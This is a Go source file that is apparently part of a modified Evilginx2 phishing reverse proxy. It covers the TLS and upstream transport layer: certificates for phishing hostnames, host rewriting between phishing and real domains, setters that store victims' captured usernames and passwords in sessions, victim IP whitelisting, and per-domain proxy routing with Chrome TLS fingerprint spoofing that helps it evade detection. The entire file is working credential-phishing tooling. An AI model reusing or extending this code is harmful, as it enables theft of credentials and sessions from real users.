// TLS/proxy transport: uTLS Chrome dialer, upstream routing, https worker, session cred setters.
package core

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"fmt"
	utls "github.com/refraction-networking/utls"
	"net"
	"net/http"
	"net/url"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/proxy"

	"github.com/elazarl/goproxy"
	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
	"github.com/inconshreveable/go-vhost"
	http_dialer "github.com/mwitkow/go-http-dialer"

	"github.com/kgretzky/evilginx2/log"
)

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		tls_cfg := &tls.Config{}
		if !p.developer {

			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)

			return tls_cfg, nil
		} else {
			var ok bool
			phish_host := ""
			if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					log.Debug("phishing hostname not found: %s", hostname)
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
			if err != nil {
				log.Error("http_proxy: %s", err)
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
	}
}

func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			rc := newPeekConn(c)
			p.noteHelloFP(rc.RemoteAddr().String(), rc.Reader)
			tlsConn, err := vhost.TLS(rc)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()
			if hostname == "" {
				return
			}

			if !p.cfg.IsActiveHostname(hostname) {
				log.Debug("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("whitelistIP: %s %s", ip_addr, sid)
	p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(10 * time.Minute).Unix()
	p.ip_sids[ip_addr+"-"+pl_name] = sid
}

func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("isWhitelistIP: %s", ip_addr+"-"+pl_name)
	ct := time.Now()
	if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
		et := time.Unix(ip_t, 0)
		return ct.Before(et)
	}
	return false
}

func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	pl := p.getPhishletByPhishHost(hostname)
	if pl != nil {
		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
		return sid, ok
	}
	return "", false
}

func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if len(address) == 0 {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be empty")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		var pdial func(network, addr string) (net.Conn, error)
		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			pdial = dproxy.Dial
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			pdial = dproxy.Dial
		}

		// per-target routing: hosts matching a route suffix go through the
		// proxy, everything else dials direct. Empty routes = all traffic
		// proxied (original behavior).
		var routes []string
		if rc := p.cfg.proxyConfig; rc != nil {
			routes = rc.Routes
		}
		direct := (&net.Dialer{Timeout: 30 * time.Second}).Dial
		if len(routes) == 0 {
			p.upstreamDial = pdial
			log.Info("proxy: ALL upstream traffic routed via %s://%s:%d", ptype, address, port)
		} else {
			sel := func(network, addr string) (net.Conn, error) {
				host := strings.ToLower(strings.SplitN(addr, ":", 2)[0])
				for _, sfx := range routes {
					if host == sfx || strings.HasSuffix(host, "."+sfx) {
						return pdial(network, addr)
					}
				}
				return direct(network, addr)
			}
			p.upstreamDial = sel
			log.Info("proxy: %d domain suffix(es) routed via %s://%s:%d, rest direct", len(routes), ptype, address, port)
		}
	} else {
		p.upstreamDial = (&net.Dialer{Timeout: 30 * time.Second}).Dial
	}
	p.applyTransport()
	return nil
}

// applyTransport wires the upstream dial path (proxy selector or direct) plus
// the optional utls TLS-fingerprint spoofing into the outbound transport.
// Called after every proxy/tlsfp change; safe to call repeatedly.

func (p *HttpProxy) applyTransport() {
	tr := p.Proxy.Tr
	tr.Dial = p.upstreamDial
	fp := ""
	if p.cfg.proxyConfig != nil {
		fp = p.cfg.proxyConfig.TLSFingerprint
	}
	if fp == "" {
		tr.DialTLSContext = nil
		return
	}
	tr.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		raw, err := p.upstreamDial(network, addr)
		if err != nil {
			return nil, err
		}
		host, _, serr := net.SplitHostPort(addr)
		if serr != nil {
			host = addr
		}
		// ALPN http/1.1 only: Go's transport cannot speak h2 over a non-standard
		// TLS conn (it type-asserts *tls.Conn), and an h2-negotiated conn carrying
		// http/1.1 breaks every request. JA3 does not include ALPN, so the
		// Chrome ClientHello fingerprint still matches on JA3. Clone the Chrome
		// spec via the patched IdToSpec wrapper and force ALPN http/1.1 in it
		// (the Chrome preset ships h2 first, which breaks here).
		spec, err := utls.IdToSpec(utls.HelloChrome_106_Shuffle)
		if err != nil {
			return nil, err
		}
		for _, ext := range spec.Extensions {
			if alpn, ok := ext.(*utls.ALPNExtension); ok {
				alpn.AlpnProtocols = []string{"http/1.1"}
			}
		}
		uc := utls.UClient(raw, &utls.Config{
			ServerName:         host,
			NextProtos:         []string{"http/1.1"},
			InsecureSkipVerify: true,
		}, utls.HelloCustom)
		if err := uc.ApplyPreset(&spec); err != nil {
			return nil, err
		}
		if err := uc.HandshakeContext(ctx); err != nil {
			return nil, err
		}
		return uc, nil
	}
	log.Info("proxy: upstream TLS fingerprint spoofing enabled (%s)", fp)
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func orPanic(err error) {
	if err != nil {
		panic(err)
	}
}

func getContentType(path string, data []byte) string {
	switch filepath.Ext(path) {
	case ".css":
		return "text/css"
	case ".js":
		return "application/javascript"
	case ".svg":
		return "image/svg+xml"
	}
	return http.DetectContentType(data)
}

func getSessionCookieName(pl_name string, cookie_name string) string {
	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
	s_hash := fmt.Sprintf("%x", hash[:4])
	s_hash = s_hash[:4] + "-" + s_hash[4:]
	return s_hash
}
